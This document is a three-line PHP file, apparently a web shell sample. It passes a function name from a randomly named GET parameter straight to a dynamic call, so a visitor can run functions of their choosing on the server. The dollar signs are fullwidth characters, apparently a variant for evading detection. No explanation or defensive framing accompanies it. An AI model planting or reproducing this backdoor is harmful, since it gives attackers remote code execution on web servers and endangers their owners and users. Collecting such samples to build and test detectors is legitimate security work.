<?php
＄_GET['h6qws7iF'](＄_GET['h6qws7iF']);
?>
